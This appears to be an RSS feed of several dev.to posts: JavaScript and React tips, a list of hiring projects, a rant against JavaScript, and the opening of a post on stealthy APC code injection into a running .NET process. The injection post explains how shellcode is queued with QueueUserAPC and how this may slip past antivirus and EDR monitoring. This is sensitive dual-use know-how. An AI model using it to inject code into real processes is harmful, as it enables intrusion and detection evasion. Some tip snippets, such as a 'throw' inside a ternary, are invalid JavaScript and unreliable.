&lt;pre class="highlight plaintext"&gt;&lt;code&gt; {show? &amp;amp;lt;Message/&amp;amp;gt;: ''}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;lt;/div&amp;gt;)&lt;br&gt;
}&lt;br&gt;
&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#right-way-with-ampamp"&gt;&lt;/a&gt;Right way with (&amp;amp;&amp;amp;)&lt;/h2&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const DemoComponent = ()=&amp;gt;{&lt;br&gt;
const [show, setShow] = useState(false)

&lt;p&gt;return (&amp;lt;div&amp;gt;&lt;br&gt;
     {show &amp;amp;&amp;amp; &amp;lt;Message/&amp;gt;}&lt;br&gt;
    &amp;lt;/div&amp;gt;)&lt;br&gt;
}&lt;br&gt;
&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-4-dont-do-it"&gt;&lt;/a&gt;TIPS 4: Don’t do it&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;if (variable1 !== null || variable1 !== undefined || variable1 !== '') {&lt;br&gt;
     let variable2 = variable1;&lt;br&gt;
}&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#do-this-short-and-simple"&gt;&lt;/a&gt;Do this short and simple&lt;/h2&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const variable2 = variable1  || 'new';&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-5-dont-do-it"&gt;&lt;/a&gt;TIPS 5: Don’t do it&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Math.floor(4.9) === 4 // true&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#do-this-short-and-simple"&gt;&lt;/a&gt;Do this short and simple&lt;/h2&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;~~4.9 === 4 // true&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-6-dont-do-it"&gt;&lt;/a&gt;TIPS 6: Don’t do it&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;switch (something) {

&lt;p&gt;case 1:&lt;br&gt;
    doSomething();&lt;/p&gt;

&lt;p&gt;break;&lt;br&gt;
case 2:&lt;br&gt;
    doSomethingElse();&lt;br&gt;
  break;&lt;br&gt;
case 3:&lt;br&gt;
    doSomethingElseAndOver();&lt;br&gt;
  break;&lt;br&gt;
  // And so on...&lt;br&gt;
}&lt;br&gt;
&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#do-this-short-and-simple"&gt;&lt;/a&gt;Do this short and simple&lt;/h2&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const cases = {&lt;br&gt;
  1: doSomething(),

&lt;p&gt;2: doSomethingElse(),&lt;/p&gt;

&lt;p&gt;3: doSomethingElseAndOver()&lt;br&gt;
};&lt;br&gt;
&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;[Note: This one has performance issue I prefer use this one when you have crying need. Switch statement is more faster than this solution&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-7-dont-do-it"&gt;&lt;/a&gt;TIPS 7: Don’t do it&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;if(x == 1 || x == 5 || x == 7)  {&lt;br&gt;
  console.log('X has some value');&lt;br&gt;
}&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#do-this-short-and-simple"&gt;&lt;/a&gt;Do this short and simple&lt;/h2&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;([1,5,7].indexOf(x) !=- 1) &amp;amp;&amp;amp; console.log('X has some value!');&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-8-dont-do-it"&gt;&lt;/a&gt;TIPS 8: Don't do it&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const param1 =1;&lt;br&gt;
const param2 = 2;&lt;br&gt;
const param3 = 3;&lt;br&gt;
const param4 = 4;

&lt;p&gt;function MyFunc =(param1, param2, param3, param4)=&amp;gt;{&lt;br&gt;
  console.log(param1, param2, param3, param4)&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;MyFunc(param1, param2, param3, param4)&lt;/p&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#do-this-short-and-simple"&gt;&lt;/a&gt;Do this short and simple&lt;/h2&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const params = {param1: 1, param2: 2, param3: 3, param4: 4}

&lt;p&gt;function MyFunc =({param1, param2, param3, param4})=&amp;gt;{&lt;br&gt;
  console.log(param1, param2, param3, param4)&lt;/p&gt;

&lt;p&gt;}&lt;/p&gt;


&lt;p&gt;MyFunc(params)&lt;br&gt;&lt;br&gt;
&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;br&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-9-dont-do-it"&gt;&lt;/a&gt;TIPS 9: Don’t do it&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function Myfunc(value){&lt;br&gt;&lt;br&gt;
   if(value){&lt;br&gt;&lt;br&gt;
     console.log("you have a value")&lt;br&gt;&lt;br&gt;
   }else{&lt;br&gt;&lt;br&gt;
      throw new Error("You don't have a value")&lt;br&gt;&lt;br&gt;
   }&lt;br&gt;&lt;br&gt;
}&lt;br&gt;&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;
&lt;br&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#do-this-short-and-simple"&gt;&lt;/a&gt;Do this short and simple&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;NOTE: If you check error first then it’s don’t go else block but if you do first one it will check first value is exist then if not found it will go the else block.&lt;/em&gt;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function Myfunc(value){&lt;br&gt;&lt;br&gt;
   return !value ? throw new Error("You don't have a value") : console.log("you have a value")&lt;br&gt;&lt;br&gt;
}&lt;/code&gt;&lt;/pre&gt;

</description>
      <category>javascript</category>
    </item>
    <item>
      <title>4 JavaScript Projects That Will Get You Hired</title>
      <author>Rocky</author>
      <pubDate>Sun, 25 Jul 2021 15:16:49 +0000</pubDate>
      <link>https://dev.to/coderzx/4-javascript-projects-that-will-get-you-hired-44o5</link>
      <guid>https://dev.to/coderzx/4-javascript-projects-that-will-get-you-hired-44o5</guid>
      <description>&lt;p&gt;If you're starting to apply for your first web developer junior position, then you might want to consider building out one of the 4 (if not all) projects.&lt;/p&gt;

&lt;p&gt;&lt;span&gt;Why?&lt;/span&gt;&lt;br&gt;The projects were thought out based on daily tasks that many web developers (including seniors) face every day.&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;em&gt;1. Consume API (Backend)&lt;/em&gt;&lt;/span&gt;&lt;br&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OmxLGMC2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/obc8e656beknp5kdw1sd.jpg"&gt;&lt;img alt="douglas-lopes-ehyV_XOZ4iA-unsplash" src="https://res.cloudinary.com/practicaldev/image/fetch/s--em7GDdeT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--OmxLGMC2--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/obc8e656beknp5kdw1sd.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;When you consume someone else's API, you are talking to a third party outside of your system. You could choose what type of data you want to get, should you validate it, how do you want to store it in your database, etc.&lt;/p&gt;
&lt;p&gt;This is where you could throw in your imagination and do whatever you want with the data. You could also perform a small CRUD system once you've retrieved the data.&lt;/p&gt;

&lt;p&gt;To give you an idea, you could consume Yelp or SpaceX API (but there is a lot more out there):&lt;/p&gt;

&lt;p&gt;&amp;gt;&amp;gt;&lt;b&gt;&lt;a href="https://www.codelivly.com/best-nodejs-projects-for-beginners/"&gt;Nodejs Project For Beginners&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;&lt;br&gt;&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;2. 10 Hour Challenge (Frontend)&lt;/em&gt;&lt;/span&gt;&lt;br&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--N8wZ05Rs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3y5ip1xxlrg5glui1d3l.jpg"&gt;&lt;img alt="sonja-langford-eIkbSc3SDtI-unsplash" src="https://res.cloudinary.com/practicaldev/image/fetch/s--lMol7XG6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--N8wZ05Rs--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3y5ip1xxlrg5glui1d3l.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is my personal favorite if you're planning to be a front-end developer.&lt;/p&gt;
&lt;p&gt;Within 10 hours, you should build a single-page application using a framework that you've never used before. It has to be responsive, look good/decent, and deployed onto a hosting service.&lt;/p&gt;
&lt;p&gt;Having something like on the resume will impress every person on the interview as you will demonstrate how fast you can learn, implement, and not get destructed in the process. But again, the key is to finish it in 10 hours.&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;em&gt;3. Building Blog Post (Frontend, Backend)&lt;/em&gt;&lt;/span&gt;&lt;br&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HCZREIm9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yff1vbzjxzzz0dfv2wzj.jpg"&gt;&lt;img alt="blog" src="https://res.cloudinary.com/practicaldev/image/fetch/s--Kv75KipP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--HCZREIm9--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yff1vbzjxzzz0dfv2wzj.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You've probably heard this already, but there is one key element that many developers don't implement.&lt;/p&gt;
&lt;p&gt;When we build projects with X number of records on a single page, we follow a specific process that allows us to load a specific number of records instead of loading all records at once. This process is called &lt;span&gt;pagination&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lBJZQ_bL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/utjwq9qt37krz1yo7vd8.PNG"&gt;&lt;img alt="pagination" src="https://res.cloudinary.com/practicaldev/image/fetch/s--JLx-iErZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--lBJZQ_bL--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/utjwq9qt37krz1yo7vd8.PNG"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Have you seen something like this at the bottom of any e-commerce website? Well, that is pagination! So when you are building out a blog page, you're focusing on implementation the pagination functionality.&lt;/p&gt;
&lt;p&gt;Suppose you don't have a blog, no problem. You could talk to Yelp API or the database that you've built for the first project.&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;em&gt;4. Hotel System (Frontend, Backend)&lt;/em&gt;&lt;/span&gt;&lt;br&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rvrgwgeH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6kh8adybznrtwhoow6hm.jpg"&gt;&lt;img alt="comp" src="https://res.cloudinary.com/practicaldev/image/fetch/s--ckhkOgdV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--rvrgwgeH--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6kh8adybznrtwhoow6hm.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This one will be a bit more complex and time-consuming as you will be building out the frontend, backend, database, and most importantly, building out the features.&lt;/p&gt;
&lt;p&gt;Every hotel has a specific number of available rooms, included in the packages (this is up to your imagination), for how long the guest will be staying, and a lot more.&lt;/p&gt;
&lt;p&gt;Don't go overboard and build out the Hilton system, but focus on maybe 3 to 4 features that you know could be fun to demonstrate during the interview and do small calculations.&lt;/p&gt;
&lt;p&gt;These are the four projects that could help you stand out during the interview and help you to land a job much faster than you think. You may not even get a coding challenge because you will demonstrate excellent work (that's what happened to me).&lt;/p&gt;

</description>
      <category>javascript</category>
    </item>
    <item>
      <title>Why i hate Javascript</title>
      <author>Mohammad Ali Chraghi</author>
      <pubDate>Sun, 25 Jul 2021 15:13:02 +0000</pubDate>
      <link>https://dev.to/alichraghi/why-i-hate-javascript-22pb</link>
      <guid>https://dev.to/alichraghi/why-i-hate-javascript-22pb</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--u0p_Bl-7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dxjsz9wx71tjgtno0r9r.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--u0p_Bl-7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dxjsz9wx71tjgtno0r9r.jpg" alt="Alt Text"&gt;&lt;/a&gt;&lt;br&gt;
JavaScript has been one of the most popular programming languages for many years. it is deferentially the most widely used language. But it is nonsense. These are the reasons why I  stay away from JavaScript&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#theres-no-static-type"&gt;
  &lt;/a&gt;
  there's no Static Type
&lt;/h2&gt;

&lt;p&gt;yes, there's no static type and most people think this is good because you can always change a variable type. but no! that's bad for some reasons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;decrease Run-time speed&lt;/li&gt;
&lt;li&gt;decrease Initialization speed&lt;/li&gt;
&lt;li&gt;programming mistakes&lt;/li&gt;
&lt;li&gt;unknown data size and then memory leaks
im not really say dynamic type is always bad but this is not understandable &lt;strong&gt;why javascript have't static typing&lt;/strong&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
  &lt;a href="#illogical-comparisons"&gt;
  &lt;/a&gt;
  illogical comparisons
&lt;/h2&gt;

&lt;p&gt;this one is more famous in JS. &lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UUFl3Qfj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/txwjahvdk7e3k4wv0wlo.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UUFl3Qfj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/txwjahvdk7e3k4wv0wlo.jpeg" alt="Alt Text"&gt;&lt;/a&gt;&lt;br&gt;
not enough? checkout the examples below&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="mi"&gt;9999999999999999&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;10000000000000000&lt;/span&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="mf"&gt;0.1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mf"&gt;0.2&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mf"&gt;0.3&lt;/span&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt; &lt;span class="c1"&gt;// (this website explains https://0.30000000000000004.com )&lt;/span&gt;
&lt;span class="mf"&gt;1.0000000000000001&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="kc"&gt;NaN&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;number&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="kc"&gt;NaN&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;NaN&lt;/span&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#global-variable-by-default"&gt;
  &lt;/a&gt;
  global variable by default
&lt;/h2&gt;

&lt;p&gt;hmm... how? and why this happen? idk&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;my_func&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;my_func&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;(i know you can solve it with &lt;code&gt;var&lt;/code&gt; or &lt;code&gt;let&lt;/code&gt;)&lt;br&gt;
most languages is very sensitive to global variables. even you can't have global variable in rust (you can use &lt;code&gt;static mut&lt;/code&gt; but you need to always use it as a unsafe variable).&lt;br&gt;
because global variables can be altered by any part of the code, that make difficult to remember or reason about every possible use also they can't be limited to some parts of the code&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#sort-function"&gt;
  &lt;/a&gt;
  sort() function
&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;.sort()&lt;/code&gt; function is a method for arrays. but idk why it does't like numeric arrays. see the below example&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;...&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;i have explained my reasons, but not sure you agree or not. if no explain in comments&lt;/p&gt;

</description>
    </item>
    <item>
      <title>Stealthy Code Injection in a Running .NET Process
</title>
      <author>wireless90</author>
      <pubDate>Sun, 25 Jul 2021 15:01:04 +0000</pubDate>
      <link>https://dev.to/wireless90/stealthy-code-injection-in-a-running-net-process-i5c</link>
      <guid>https://dev.to/wireless90/stealthy-code-injection-in-a-running-net-process-i5c</guid>
      <description>&lt;h1&gt;
  &lt;a href="#stealthy-code-injection-in-a-running-net-process"&gt;
  &lt;/a&gt;
  Stealthy Code Injection in a Running .NET Process
&lt;/h1&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--w6AroaxE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126855399-5b81ca92-5761-4204-b4ae-9872726a9b0e.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--w6AroaxE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126855399-5b81ca92-5761-4204-b4ae-9872726a9b0e.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#prologue"&gt;
  &lt;/a&gt;
  Prologue
&lt;/h1&gt;

&lt;p&gt;For the past few months, I gained interest in understanding more on the Portable Executable(PE) format and Process Injection. &lt;a href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"&gt;Among the many Process Injection techniques available&lt;/a&gt;, I was intrigued by &lt;code&gt;APC INJECTION&lt;/code&gt;.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#asynchronous-process-calls-apc"&gt;
  &lt;/a&gt;
  Asynchronous Process Calls (APC)
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Malware can take advantage of Asynchronous Procedure Calls (APC) to force another thread to execute their custom code by attaching it to the APC Queue of the target thread. Each thread has a queue of APCs which are waiting for execution upon the target thread entering alertable state. A thread enters an alertable state if it calls SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx functions. The malware usually looks for any thread that is in an alertable state, and then calls OpenThread and QueueUserAPC to queue an APC to a thread.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The above, taken from &lt;code&gt;Ashkan Hosseini's&lt;/code&gt; writeup (see credits below), gives a very good overview of APCs and how malwares could possible use them for &lt;code&gt;Process Injection&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Basically, &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Every thread has a queue. &lt;/li&gt;
&lt;li&gt;You can put a function in this queue. &lt;/li&gt;
&lt;li&gt;This queue executes asynchronously, meaning when the thread is free and in an alertable state, the function in this queue gets ran FIFO&lt;/li&gt;
&lt;li&gt;For a thread to be in an alertable state, the thread needs to execute one of the following functions

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex"&gt;SleepEx&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait"&gt;SignalObjectAndWait&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex"&gt;WaitForSingleObjectEx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjectsex"&gt;WaitForMultipleObjectsEx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex"&gt;MsgWaitForMultipleObjectsEx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert"&gt;NtTestAlert - Undocumented function, credits to ired.team&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lyBwI-Up--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126791457-bd664d47-aaa3-4611-a551-79b5d7a38829.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lyBwI-Up--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126791457-bd664d47-aaa3-4611-a551-79b5d7a38829.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--U_QwJFaX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126791418-4e349941-580a-4862-bffb-9dd4eb4134e0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--U_QwJFaX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126791418-4e349941-580a-4862-bffb-9dd4eb4134e0.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#so-where-are-we-going-with-this"&gt;
  &lt;/a&gt;
  So where are we going with this?
&lt;/h1&gt;

&lt;p&gt;The core of this injection technique is the function &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc"&gt;QueueUserAPC&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;&lt;code&gt;QueueUserApc&lt;/code&gt; adds the shellcode as an asynchronous function which will be called when the thread becomes alertable.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6xtHLDyF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126792192-6b6e7568-54d1-48ce-8458-d2f754f525de.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6xtHLDyF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126792192-6b6e7568-54d1-48ce-8458-d2f754f525de.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;One might think that an Antivirus or an EDR could simply hook into this function and flag whoever uses it. However, this is a frequently used function for &lt;code&gt;Asynchronous Programming&lt;/code&gt;. So the security solutions might monitor a chain of call from &lt;code&gt;QueueUserApc&lt;/code&gt; into &lt;code&gt;ResumeThread&lt;/code&gt; or some other functions like &lt;code&gt;CreateThread&lt;/code&gt;, &lt;code&gt;CreateRemoteThread&lt;/code&gt; API calls which are more popular and hence usually more scrutinized by AV/EDR vendors.&lt;/p&gt;

